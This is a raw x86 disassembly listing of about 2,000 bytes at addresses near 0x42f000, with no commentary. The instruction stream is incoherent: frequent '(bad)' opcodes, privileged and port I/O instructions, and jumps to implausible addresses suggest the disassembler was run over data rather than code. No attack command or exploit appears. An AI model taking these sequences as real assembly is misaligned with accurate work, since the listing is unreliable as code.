  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	jb     0x42f033
  42f082:	jno    0x42f042
  42f084:	pusha  
  42f085:	test   DWORD PTR [ecx],0x10400
  42f08b:	add    BYTE PTR [edi+0x4],ah
  42f08e:	sahf   
  42f08f:	sbb    bl,BYTE PTR [eax]
  42f091:	push   cs
  42f092:	fdivrp st(3),st
  42f094:	div    BYTE PTR [eax-0x7a]
  42f097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f098:	and    BYTE PTR [ebp+0x36],dh
  42f09b:	cmp    DWORD PTR [ebp*4-0x7cee84b3],edx
  42f0a2:	mov    esp,ebx
  42f0a4:	enter  0xbd97,0xb0
  42f0a8:	das    
  42f0a9:	push   edi
  42f0aa:	js     0x42f046
  42f0ac:	push   esp
  42f0ad:	sub    bl,dh
  42f0af:	pop    edi
  42f0b0:	jmp    0x3f400514
  42f0b5:	cmp    BYTE PTR [edi-0x4a],cl
  42f0b8:	sub    al,BYTE PTR [esi+0x3b]
  42f0bb:	ss pop esi
  42f0bd:	cli    
  42f0be:	dec    ebp
  42f0bf:	push   edi
  42f0c0:	(bad)  
  42f0c1:	jecxz  0x42f127
  42f0c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f0c4:	outs   dx,DWORD PTR ds:[esi]
  42f0c5:	out    dx,eax
  42f0c6:	js     0xef025842
  42f0cc:	mov    eax,ds:0x6f829b9e
  42f0d1:	shr    DWORD PTR [si+0x65],cl
  42f0d5:	stc    
  42f0d6:	jno    0x42f086
  42f0d8:	dec    esi
  42f0d9:	bound  esi,QWORD PTR [edi-0x1b649a94]
  42f0df:	and    ecx,edx
  42f0e1:	or     ebx,DWORD PTR [ebx]
  42f0e3:	xor    eax,0xf6768d08
  42f0e8:	das    
  42f0e9:	push   ebp
  42f0ea:	and    ah,ah
  42f0ec:	out    0x16,eax
  42f0ee:	pop    edx
  42f0ef:	push   0x14
  42f0f1:	pop    ebp
  42f0f2:	outs   dx,BYTE PTR ds:[esi]
  42f0f3:	or     esi,DWORD PTR [ebp-0x227ced0b]
  42f0f9:	ds sti 
  42f0fb:	xchg   edi,eax
  42f0fc:	cmp    al,0xff
  42f0fe:	mov    edx,DWORD PTR [esi-0x1a]
  42f101:	push   edi
  42f102:	sub    al,0x3c
  42f104:	pop    ds
  42f105:	popa   
  42f106:	shl    BYTE PTR [ebx+0x36],1
  42f109:	arpl   WORD PTR [esi-0x6e],sp
  42f10c:	pop    edi
  42f10d:	and    ebx,esp
  42f10f:	mov    cl,0xc0
  42f111:	fs pop ss
  42f113:	cmp    ebx,DWORD PTR [edi+esi*2-0x4f]
  42f117:	mov    ds:0x4ae89a2d,al
  42f11c:	adc    ebx,DWORD PTR [esi-0x11]
  42f11f:	add    esi,DWORD PTR [ecx]
  42f121:	aad    0xcf
  42f123:	es es clc 
  42f126:	pop    ss
  42f127:	pop    ebp
  42f128:	jmp    0x42f117
  42f12a:	adc    al,0x68
  42f12c:	jns    0x42f183
  42f12e:	adc    eax,DWORD PTR [edi+0x61]
  42f131:	dec    ebp
  42f132:	jg     0x42f1af
  42f134:	shl    esp,0x5
  42f137:	jl     0x42f18e
  42f139:	inc    edx
  42f13a:	sbb    ebp,edx
  42f13c:	cmp    dl,bl
  42f13e:	jge    0x42f1a3
  42f140:	test   DWORD PTR [edx-0xc],esp
  42f143:	xchg   edx,eax
  42f144:	mov    dh,0xee
  42f146:	xchg   cl,bl
  42f148:	push   0x24
  42f14a:	pop    edx
  42f14b:	loopne 0x42f15a
  42f14d:	fs daa 
  42f14f:	dec    ebp
  42f150:	push   esp
  42f151:	stc    
  42f152:	push   ss
  42f153:	test   ecx,esp
  42f155:	pop    edi
  42f156:	jmp    0x42f116
  42f158:	mov    es,edx
  42f15a:	(bad)  
  42f15b:	mov    ebx,0xbc2c8d9e
  42f160:	mov    eax,ds:0x19b7c8ca
  42f165:	inc    ebx
  42f166:	fs or  bl,ch
  42f169:	mov    edi,0x2bf4f1e8
  42f16e:	outs   dx,BYTE PTR ds:[esi]
  42f16f:	adc    eax,0xc8be597b
  42f174:	stos   DWORD PTR es:[edi],eax
  42f175:	pop    ebp
  42f176:	rol    DWORD PTR [esi+0x46],0xd5
  42f17a:	enter  0x3991,0xa8
  42f17e:	retf   
  42f17f:	pushf  
  42f180:	addr16 mov ch,0x3e
  42f183:	test   eax,0x315f251f
  42f188:	add    ecx,edi
  42f18a:	push   es
  42f18b:	pusha  
  42f18c:	add    eax,0x5b20c2
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	daa    
  42f201:	mov    dh,0xa0
  42f203:	mov    ebp,0x1f864
  42f208:	add    al,0x1
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	bound  esi,QWORD PTR [edi+0x7f70f9e4]
  42f212:	gs out 0xac,al
  42f215:	dec    ebx
  42f216:	cmp    DWORD PTR [esi],0x32ce2856
  42f21c:	retf   
  42f21d:	adc    BYTE PTR [ecx-0x13],bl
  42f220:	div    DWORD PTR [ecx-0x6]
  42f223:	and    ch,bh
  42f225:	sahf   
  42f226:	pop    ebx
  42f227:	maskmovq mm6,mm6
  42f22a:	xor    dh,BYTE PTR [edx+0x1e]
  42f22d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f22e:	jge    0x42f262
  42f230:	mov    cl,0xe0
  42f232:	hlt    
  42f233:	int3   
  42f234:	or     edi,DWORD PTR [edx]
  42f236:	sar    bl,1
  42f238:	xlat   BYTE PTR ds:[ebx]
  42f239:	cmp    eax,0xa6e54a28
  42f23e:	cs imul ebx,eax,0xffffffe2
  42f242:	frstor [eax]
  42f244:	xor    al,0xc4
  42f246:	mov    bl,0x68
  42f248:	inc    ecx
  42f249:	test   ebx,esp
  42f24b:	jmp    0xfbee:0x9b2c2d30
  42f252:	cmp    eax,0xd76898f
  42f257:	xchg   edi,eax
  42f258:	fistp  DWORD PTR [ebp+eiz*8+0x4570f820]
  42f25f:	mov    BYTE PTR [ecx+0x78d1a8ec],bh
  42f265:	jg     0x42f2d4
  42f267:	out    dx,eax
  42f268:	or     edi,eax
  42f26a:	push   ss
  42f26b:	mov    BYTE PTR [edx+0x4c],cl
  42f26e:	mov    edx,0x6c38e883
  42f273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f274:	in     eax,dx
  42f275:	in     al,dx
  42f276:	scas   al,BYTE PTR es:[edi]
  42f277:	fistp  DWORD PTR [ebx+0xaa93bf4]
  42f27d:	lea    edi,ds:0xb08a9faf
  42f283:	dec    ebp
  42f284:	dec    ebp
  42f285:	pop    eax
  42f286:	out    dx,eax
  42f287:	stos   DWORD PTR es:[edi],eax
  42f288:	lods   eax,DWORD PTR ds:[esi]
  42f289:	test   esp,edx
  42f28b:	cld    
  42f28c:	xchg   DWORD PTR [ebx+eax*2-0x63],ebx
  42f290:	and    ch,bl
  42f292:	call   0x62aeec7c
  42f297:	mov    ds:0x35e7b109,al
  42f29c:	mov    dh,0x6
  42f29e:	mov    eax,ds:0x4849258f
  42f2a3:	jl     0x42f262
  42f2a5:	fistp  WORD PTR [edx-0x44]
  42f2a8:	lea    esi,[esp+edi*4+0x304e7aff]
  42f2af:	loop   0x42f28f
  42f2b1:	cmp    ecx,DWORD PTR [edi+0x6b]
  42f2b4:	pop    ecx
  42f2b5:	lods   eax,DWORD PTR ds:[esi]
  42f2b6:	push   es
  42f2b7:	sbb    BYTE PTR ds:[ebx+0x5f35983b],0xae
  42f2bf:	mov    ds:0xd721067c,eax
  42f2c4:	int    0xf0
  42f2c6:	mov    bh,0x13
  42f2c8:	neg    BYTE PTR [edi]
  42f2ca:	(bad)  
  42f2cb:	hlt    
  42f2cc:	in     eax,dx
  42f2cd:	retf   0x6ea
  42f2d0:	sub    edx,DWORD PTR [edi+0x2]
  42f2d3:	and    edi,DWORD PTR [eax+0x1d76a7c4]
  42f2d9:	icebp  
  42f2da:	(bad)  
  42f2dc:	xchg   esp,eax
  42f2dd:	push   ds
  42f2de:	push   0xfffffff9
  42f2e0:	ja     0x42f2f0
  42f2e2:	mov    al,0xd6
  42f2e4:	loope  0x42f357
  42f2e6:	shl    eax,0xc4
  42f2e9:	pop    ebx
  42f2ea:	jl     0x42f273
  42f2ec:	cmp    al,0x9e
  42f2ee:	add    BYTE PTR [edi+0x1c9f65a9],dh
  42f2f4:	cdq    
  42f2f5:	jle    0x42f2a9
  42f2f7:	stos   DWORD PTR es:[edi],eax
  42f2f8:	lahf   
  42f2f9:	push   es
  42f2fa:	mov    edi,0x58976aa1
  42f2ff:	inc    esp
  42f300:	rcl    dh,1
  42f302:	(bad)  
  42f303:	mov    eax,es
  42f305:	xor    DWORD PTR [eax+ebx*2-0x15bf84e5],ecx
  42f30c:	cs add eax,0x4ea3
	...
  42f372:	add    BYTE PTR [eax],al
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	test   DWORD PTR [eax],ecx
  42f382:	gs inc edi
  42f384:	push   0x40001f9
  42f389:	add    DWORD PTR [eax],eax
  42f38b:	add    BYTE PTR [edi-0x3c2e3c28],al
  42f391:	das    
  42f392:	jmp    0x78e077df
  42f397:	gs push ecx
  42f399:	push   dx
  42f39b:	daa    
  42f39c:	cmp    al,0x11
  42f39e:	xor    bl,bh
  42f3a0:	or     edi,ebx
  42f3a2:	jbe    0x42f368
  42f3a4:	push   esi
  42f3a5:	push   edx
  42f3a6:	jecxz  0x42f370
  42f3a8:	and    DWORD PTR [esi-0x2820c08a],esi
  42f3ae:	in     al,0x4
  42f3b0:	mov    edx,DWORD PTR [esi+edx*2+0x59]
  42f3b4:	xchg   edi,eax
  42f3b5:	cli    
  42f3b6:	das    
  42f3b7:	cld    
  42f3b8:	cmp    bl,BYTE PTR [esi]
  42f3ba:	push   edi
  42f3bb:	mov    ah,BYTE PTR [ecx-0x3a25c992]
  42f3c1:	xor    ebp,DWORD PTR [ecx]
  42f3c3:	sub    bh,ch
  42f3c5:	mov    BYTE PTR [ebp-0x4617565e],0xb4
  42f3cc:	sti    
  42f3cd:	mov    esp,0xd0325543
  42f3d2:	and    eax,0x46cb47e5
  42f3d7:	and    DWORD PTR [ecx-0x6f],0xe37eae58
  42f3de:	push   ebp
  42f3df:	mov    bh,0x3
  42f3e1:	mov    bl,0x15
  42f3e3:	ret    
  42f3e4:	fisubr DWORD PTR [edx-0x40469aa6]
  42f3ea:	gs adc eax,0x4fab2011
  42f3f0:	mov    BYTE PTR [ebx+0x3b3d17e0],bl
  42f3f6:	mov    dh,0x6c
  42f3f8:	sbb    al,0x1
  42f3fa:	hlt    
  42f3fb:	xchg   edx,eax
  42f3fc:	imul   eax,DWORD PTR [ebx+esi*2],0x728866e4
  42f403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f404:	outs   dx,BYTE PTR ds:[esi]
  42f405:	push   ecx
  42f406:	pop    ebp
  42f407:	dec    esi
  42f408:	int3   
  42f409:	mov    al,0xb9
  42f40b:	mov    cl,0xe1
  42f40d:	sti    
  42f40e:	sbb    DWORD PTR [edi+edi*1],esi
  42f411:	loop   0x42f3ab
  42f413:	add    esp,DWORD PTR [edx]
  42f415:	fs pop edi
  42f417:	pop    eax
  42f418:	mov    ebp,0xc8266b5c
  42f41d:	sahf   
  42f41e:	pop    edx
  42f41f:	in     al,0x77
  42f421:	rcl    DWORD PTR [edi],cl
  42f423:	sbb    ecx,esi
  42f425:	test   BYTE PTR [edi+0x63],dh
  42f428:	inc    DWORD PTR [edi-0x69]
  42f42b:	gs out dx,eax
  42f42d:	jae    0x42f3b2
  42f42f:	dec    esi
  42f430:	xor    al,0x77
  42f432:	push   0x29bdc05c
  42f437:	jmp    0x42f438
  42f439:	mov    ah,0x8
  42f43b:	in     al,dx
  42f43c:	xchg   ebx,eax
  42f43d:	push   ebp
  42f43e:	mov    BYTE PTR [ecx],ch
  42f440:	test   eax,0x4c19908
  42f445:	jecxz  0x42f450
  42f447:	mov    bl,0x6f
  42f449:	mov    ds:0xe9c46c07,al
  42f44e:	aas    
  42f44f:	dec    ebp
  42f450:	mov    bh,0x3c
  42f452:	dec    esp
  42f453:	xchg   ebx,eax
  42f454:	and    al,0x3e
  42f456:	sbb    bl,BYTE PTR [edi-0x45]
  42f459:	jns    0x42f4d9
  42f45b:	push   ecx
  42f45c:	rol    BYTE PTR [edx],cl
  42f45e:	push   ebp
  42f45f:	pop    ss
  42f460:	push   ds
  42f461:	sahf   
  42f462:	and    DWORD PTR [ecx],edi
  42f464:	mov    dl,BYTE PTR [esi-0x33]
  42f467:	mov    ch,0x5e
  42f469:	in     al,0xc5
  42f46b:	push   ss
  42f46c:	add    BYTE PTR [eax+0x4cd4ce00],0x80
  42f473:	pop    ebp
  42f474:	repz jnp 0x42f4ee
  42f477:	inc    ebx
  42f478:	push   edx
  42f479:	xor    BYTE PTR [eax+edx*4-0x2f],0xb6
  42f47e:	out    0xef,al
  42f480:	std    
  42f481:	loop   0x42f4a4
  42f483:	and    al,bl
  42f485:	ins    BYTE PTR es:[edi],dx
  42f486:	hlt    
  42f487:	add    edi,DWORD PTR [ecx]
  42f489:	rcl    DWORD PTR [edx],cl
  42f48b:	xchg   ecx,eax
  42f48c:	push   edi
  42f48d:	pop    edx
  42f48e:	mov    esp,0x86
	...
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	xchg   ecx,eax
  42f501:	mov    cl,BYTE PTR [edx]
  42f503:	or     DWORD PTR [edx+edi*8+0x1],ebp
  42f507:	add    BYTE PTR [ecx+eax*1],al
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	(bad)  
  42f50e:	inc    esi
  42f50f:	bound  esp,QWORD PTR [eax-0x6b]
  42f512:	lods   al,BYTE PTR ds:[esi]
  42f513:	push   ds
  42f514:	das    
  42f515:	mov    bh,0xf6
  42f517:	cmp    BYTE PTR [edi],bh
  42f519:	cmp    eax,ecx
  42f51b:	fwait
  42f51c:	push   esp
  42f51d:	cmp    al,dh
  42f51f:	pusha  
  42f520:	mov    ds:0xafb7f38b,al
  42f525:	stc    
  42f526:	jmp    0x42f543
  42f528:	ficom  WORD PTR [edi+0x49]
  42f52b:	ss xchg ebx,eax
  42f52d:	adc    ecx,DWORD PTR [edi-0x3e]
  42f530:	pop    ds
  42f531:	xor    al,0x0
  42f533:	ret    0x6c7d
  42f536:	lock (bad) 
  42f538:	sub    eax,DWORD PTR [eax]
  42f53a:	clc    
  42f53b:	mov    ch,0x23
  42f53d:	xor    dl,bh
  42f53f:	cmp    esi,edi
  42f541:	std    
  42f542:	les    ecx,FWORD PTR [ebx-0x30]
  42f545:	push   es
  42f546:	js     0x42f57f
  42f548:	or     bh,ah
  42f54a:	push   esp
  42f54b:	(bad)  
  42f54c:	fisub  DWORD PTR [ebp-0x4d866ee3]
  42f552:	jl     0x42f512
  42f554:	mov    DWORD PTR [ecx],ebp
  42f556:	add    al,0xab
  42f558:	retf   
  42f559:	enter  0x8127,0x17
  42f55d:	(bad)  
  42f55e:	cdq    
  42f55f:	mov    eax,DWORD PTR [edi-0x290a0c7c]
  42f565:	lea    esi,[ebp-0x51004d79]
  42f56b:	aam    0xc2
  42f56d:	clc    
  42f56e:	repz sub eax,0x722b186b
  42f574:	sbb    dl,ch
  42f576:	arpl   WORD PTR [esi],sp
  42f578:	loope  0x42f5cd
  42f57a:	adc    edi,0x8efbe110
  42f580:	jne    0x42f563
  42f582:	adc    al,0xd6
  42f584:	not    DWORD PTR [eax+ebp*4+0x77]
  42f588:	cmp    BYTE PTR [edx-0x41],bl
  42f58b:	in     al,0x6e
  42f58d:	add    edi,DWORD PTR [ebx]
  42f58f:	es cmp al,0x8
  42f592:	dec    eax
  42f593:	rol    BYTE PTR [ecx-0x3e3d9bf5],0x2d
  42f59a:	and    edx,ecx
  42f59c:	dec    ecx
  42f59d:	fidivr DWORD PTR [esi*8+0x232a0618]
  42f5a4:	lahf   
  42f5a5:	dec    eax
  42f5a6:	jb     0x42f56d
  42f5a8:	ficom  WORD PTR [esi]
  42f5aa:	test   dl,bl
  42f5ac:	inc    edx
  42f5ad:	aad    0x63
  42f5af:	ficom  DWORD PTR [ecx+0x98cad7f]
  42f5b5:	les    ecx,FWORD PTR [esi-0x738a2d1e]
  42f5bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f5bc:	fcompp 
  42f5be:	gs jno 0x42f63d
  42f5c1:	pop    edi
  42f5c2:	xor    eax,0x478d28d9
  42f5c7:	pushf  
  42f5c8:	sahf   
  42f5c9:	and    eax,0xe772e5a8
  42f5ce:	or     bh,dh
  42f5d0:	or     ch,ch
  42f5d2:	mov    eax,0x48ed4561
  42f5d7:	inc    ecx
  42f5d8:	enter  0x5aa,0xad
  42f5dc:	stos   BYTE PTR es:[edi],al
  42f5dd:	adc    BYTE PTR [esi+0x3],al
  42f5e0:	loop   0x42f5f5
  42f5e2:	or     al,BYTE PTR [esi]
  42f5e4:	rol    ch,cl
  42f5e6:	jg     0x42f577
  42f5e8:	add    dh,cl
  42f5ea:	data16 jge 0x42f5f2
  42f5ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f5ee:	sar    DWORD PTR [edi],1
  42f5f0:	outs   dx,DWORD PTR ds:[esi]
  42f5f1:	inc    ebx
  42f5f2:	and    DWORD PTR [ebx],ebx
  42f5f4:	mov    al,0xef
  42f5f6:	loopne 0x42f5d8
  42f5f8:	(bad)  
  42f5f9:	mov    WORD PTR cs:[eax-0x74],ss
  42f5fd:	push   ds
  42f5fe:	mov    esi,DWORD PTR [ebx-0x3d31e588]
  42f604:	or     ecx,DWORD PTR [eax+0x7c]
  42f607:	jmp    0x42f5f6
  42f609:	outs   dx,DWORD PTR ds:[esi]
  42f60a:	sub    eax,0xcc9817b6
  42f60f:	inc    ebx
	...
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	into   
  42f681:	sbb    DWORD PTR [edi-0x56],edx
  42f684:	jo     0x42f681
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	dec    eax
  42f68d:	mov    BYTE PTR [eax-0x56d5ee88],bl
  42f693:	fwait
  42f694:	add    edi,DWORD PTR ds:0x9583ba1
  42f69a:	imul   ebx,DWORD PTR [esi-0x58],0xf
  42f69e:	mov    ch,0x37
  42f6a0:	aaa    
  42f6a1:	xor    BYTE PTR [edx-0x6e833578],cl
  42f6a7:	dec    ebp
  42f6a8:	add    al,0x7c
  42f6aa:	shl    DWORD PTR [edx],cl
  42f6ac:	inc    ebx
  42f6ad:	ins    BYTE PTR es:[edi],dx
  42f6ae:	mov    al,0x5c
  42f6b0:	aas    
  42f6b1:	gs (bad) 
  42f6b3:	jl     0x42f713
  42f6b5:	retf   0x882c
  42f6b8:	rcr    BYTE PTR [ecx],0x89
  42f6bb:	push   ss
  42f6bc:	mov    esp,esp
  42f6be:	xchg   ebp,eax
  42f6bf:	dec    edi
  42f6c0:	nop
  42f6c1:	ret    
  42f6c2:	sbb    DWORD PTR [edx+0x5a458bfd],esi
  42f6c8:	add    BYTE PTR [ecx+0xfb3ac13],ch
  42f6ce:	scas   al,BYTE PTR es:[edi]
  42f6cf:	xor    dh,BYTE PTR [edi-0x477b2fa0]
  42f6d5:	push   edi
  42f6d6:	pop    fs
  42f6d8:	fcomi  st,st(3)
  42f6da:	mov    ds:0xcec20c89,al
  42f6df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f6e0:	sbb    ecx,DWORD PTR [eax]
  42f6e2:	and    ebp,DWORD PTR [esi+esi*4]
  42f6e5:	(bad)  
  42f6e6:	pop    ecx
  42f6e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6e8:	push   esi
  42f6e9:	mov    ds:0x63c48ce1,eax
  42f6ee:	jle    0x42f705
  42f6f0:	retf   0xcf78
  42f6f3:	iret   
  42f6f4:	aaa    
  42f6f5:	jge    0x42f74d
  42f6f7:	ja     0x42f6ee
  42f6f9:	sub    eax,0x84f38bff
  42f6fe:	in     al,dx
  42f6ff:	pusha  
  42f700:	lock adc al,0x34
  42f703:	sahf   
  42f704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f705:	mov    ebp,0xedd2c274
  42f70a:	jo     0x42f6d9
  42f70c:	jmp    0x42f6d7
  42f70e:	mov    fs,ebp
  42f710:	sub    dl,BYTE PTR [ecx+0x5d3366e]
  42f716:	sub    al,0x43
  42f718:	addr16 jp 0x42f72d
  42f71b:	cwde   
  42f71c:	scas   al,BYTE PTR es:[edi]
  42f71d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f71e:	mov    BYTE PTR [ebp+0x5fa7a92e],ch
  42f724:	sahf   
  42f725:	ret    
  42f726:	int3   
  42f727:	jns    0x42f717
  42f729:	push   esi
  42f72a:	xchg   ebp,eax
  42f72b:	xchg   ebx,eax
  42f72c:	call   0x148a15fb
  42f731:	outs   dx,DWORD PTR ds:[esi]
  42f732:	fisttp WORD PTR [ebx-0x5b]
  42f735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f736:	push   ebx
  42f737:	cwde   
  42f738:	xchg   ebx,eax
  42f739:	lds    edi,FWORD PTR ss:[edi]
  42f73c:	aad    0xb1
  42f73e:	iret   
  42f73f:	fsubrp st(1),st
  42f741:	in     eax,0x8e
  42f743:	xchg   edi,eax
  42f744:	out    0xf4,al
  42f746:	sub    bh,cl
  42f748:	mov    eax,ds:0x6449a456
  42f74d:	call   0x8888ed48
  42f752:	xchg   esp,eax
  42f753:	mov    fs,WORD PTR [edi+0x5285ff11]
  42f759:	hlt    
  42f75a:	xor    eax,0x4337567a
  42f75f:	add    DWORD PTR [ecx-0x2d],0xffffff90
  42f763:	fld    TBYTE PTR [esi-0x408bfe2]
  42f769:	outs   dx,BYTE PTR ds:[esi]
  42f76a:	stc    
  42f76b:	add    esi,DWORD PTR [ebp-0x72]
  42f76e:	xchg   DWORD PTR [esi+0x6191cfa3],ebp
  42f774:	mov    ds,eax
  42f776:	mov    ch,BYTE PTR [esi+0x5405efd1]
  42f77c:	sbb    al,0xad
  42f77e:	inc    edi
  42f77f:	pop    edi
  42f780:	fsubp  st(3),st
  42f782:	mov    eax,0x516153c
  42f787:	outs   dx,DWORD PTR ds:[esi]
  42f788:	fcom   st(1)
  42f78a:	and    BYTE PTR [edi+0x1d],bl
  42f78d:	jge    0x42f7c0
  42f78f:	pop    esi
	...
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xfe1e1762
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	outs   dx,BYTE PTR ds:[esi]
  42f80d:	sbb    ecx,eax
  42f80f:	push   esi
  42f810:	adc    cl,BYTE PTR [ebx+0x3a83b044]
  42f816:	inc    eax
  42f817:	mov    bl,0x49
  42f819:	into   
  42f81a:	cmp    al,0x3b
  42f81c:	retf   
  42f81d:	faddp  st(5),st
  42f81f:	jmpw   0x934b
  42f823:	and    eax,esi
  42f825:	rcr    BYTE PTR [ebx-0x6d],cl
  42f828:	ins    DWORD PTR es:[edi],dx
  42f829:	test   eax,0x48fbe3ce
  42f82e:	dec    esp
  42f82f:	jle    0x42f837
  42f831:	or     DWORD PTR [esp+eiz*8+0x67],esp
  42f835:	mov    dh,0x67
  42f837:	repnz pop edx
  42f839:	jae    0x42f81a
  42f83b:	(bad)  
  42f83c:	or     DWORD PTR [ebx-0x3f],ebx
  42f83f:	push   esp
  42f840:	je     0x42f82d
  42f842:	jecxz  0x42f876
  42f844:	or     ebp,DWORD PTR [edx-0x3b027ca3]
  42f84a:	or     dh,BYTE PTR [esi]
  42f84c:	jno    0x42f872
  42f84e:	lods   al,BYTE PTR ds:[esi]
  42f84f:	or     BYTE PTR [edx],0x8f
  42f852:	arpl   WORD PTR [ecx],ax
  42f854:	in     al,dx
  42f855:	jo     0x42f892
  42f857:	mov    bl,0xe6
  42f859:	sub    al,0xa4
  42f85b:	push   DWORD PTR [edi+ecx*2-0x11]
  42f85f:	adc    dl,dh
  42f861:	sbb    al,0x8e
  42f863:	xchg   ebx,eax
  42f864:	cmp    eax,0x378b72a
  42f869:	nop
  42f86a:	cwde   
  42f86b:	ja     0x42f8bf
  42f86d:	repz push ebp
  42f86f:	xor    eax,0x164bdf79
  42f874:	lock dec ebp
  42f876:	adc    eax,0x990998fd
  42f87b:	pop    ecx
  42f87c:	dec    ebx
  42f87d:	fisttp QWORD PTR [eax+0x7d]
  42f880:	fidivr DWORD PTR [ebx+eax*2+0x48038b1d]
  42f887:	dec    ebp
  42f888:	ret    
  42f889:	ror    BYTE PTR [edx+0x5c1d2536],cl
  42f88f:	mov    ds:0xcdd92936,al
  42f894:	(bad)  
  42f895:	xchg   edx,eax
  42f896:	call   DWORD PTR [ebp-0x42ed64e3]
  42f89c:	mov    edi,0xcd892889
  42f8a1:	(bad)  
  42f8a2:	call   0xd582:0x5fb684d1
  42f8a9:	(bad)  
  42f8aa:	into   
  42f8ab:	sbb    ebp,ecx
  42f8ad:	sbb    DWORD PTR [esi+0x3a],esp
  42f8b0:	fbstp  TBYTE PTR [eax]
  42f8b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8b3:	pop    es
  42f8b4:	dec    edx
  42f8b5:	test   eax,0x13c3d675
  42f8ba:	(bad)  
  42f8bb:	mov    ebx,0x5ca2d74f
  42f8c0:	jge    0x42f863
  42f8c2:	mov    edx,0xf22d7175
  42f8c7:	icebp  
  42f8c8:	jmp    0x42f949
  42f8ca:	out    dx,eax
  42f8cb:	test   eax,0xceb3eb6b
  42f8d0:	jg     0x42f8c8
  42f8d2:	xchg   ecx,eax
  42f8d3:	sub    al,0x8
  42f8d5:	xchg   BYTE PTR [esi],ah
  42f8d7:	mov    al,BYTE PTR [ebx+0x1c]
  42f8da:	stos   BYTE PTR es:[edi],al
  42f8db:	pop    edi
  42f8dc:	push   eax
  42f8dd:	rcr    BYTE PTR [edi+0x43],0x4
  42f8e1:	mov    gs,WORD PTR [eax]
  42f8e3:	aas    
  42f8e4:	gs (bad) 
  42f8e6:	out    dx,al
  42f8e7:	fst    DWORD PTR [ebp+0x4b7af929]
  42f8ed:	out    dx,al
  42f8ee:	stc    
  42f8ef:	mov    ds:0x827f03b1,eax
  42f8f4:	inc    ebp
  42f8f5:	pop    ds
  42f8f6:	push   eax
  42f8f7:	xchg   esp,eax
  42f8f8:	js     0x42f903
  42f8fa:	add    esp,DWORD PTR [edx*8-0x792891e9]
  42f901:	sbb    ch,BYTE PTR [ebp+0x780f09aa]
  42f907:	outs   dx,BYTE PTR ds:[esi]
  42f908:	outs   dx,BYTE PTR ds:[esi]
  42f909:	outs   dx,BYTE PTR ds:[esi]
  42f90a:	enter  0x3db4,0x54
  42f90e:	in     eax,0x98
	...
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f929
  42f981:	push   ss
  42f982:	scas   al,BYTE PTR es:[edi]
  42f983:	popf   
  42f984:	js     0x42f983
  42f986:	add    DWORD PTR [eax],eax
  42f988:	add    al,0x1
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	inc    ebp
  42f98d:	(bad)  
  42f98e:	fwait
  42f98f:	repnz mov bl,0xd2
  42f992:	pop    ebx
  42f993:	leave  
  42f994:	jne    0x42f95e
  42f996:	and    DWORD PTR [eax],ecx
  42f998:	fldcw  WORD PTR [eax]
  42f99a:	outs   dx,BYTE PTR ds:[esi]
  42f99b:	jmp    0x82548493
  42f9a0:	mov    esp,0xfa7869ab
  42f9a5:	xchg   ebx,eax
  42f9a6:	in     al,0x8e
  42f9a8:	popf   
  42f9a9:	retf   0x11f2
  42f9ac:	push   esp
  42f9ad:	mov    ah,0xf8
  42f9af:	push   0x52421ef8
  42f9b4:	push   esi
  42f9b5:	ror    DWORD PTR [edx+eax*4],0x34
  42f9b9:	and    ebp,DWORD PTR [edi]
  42f9bb:	mov    ebp,0x3442ea5b
  42f9c0:	cmc    
  42f9c1:	mov    bh,0x44
  42f9c3:	inc    eax
  42f9c4:	pop    ss
  42f9c5:	mov    eax,ds:0x68e2edc4
  42f9ca:	leave  
  42f9cb:	int3   
  42f9cc:	inc    edx
  42f9cd:	aas    
  42f9ce:	xor    DWORD PTR [eax],eax
  42f9d0:	jo     0x42fa26
  42f9d2:	sti    
  42f9d3:	fcom   DWORD PTR [ebx-0x12]
  42f9d6:	(bad)  
  42f9d7:	xchg   ebp,eax
  42f9d8:	out    0xaa,al
  42f9da:	sub    DWORD PTR [eax-0xd3355d9],ebx
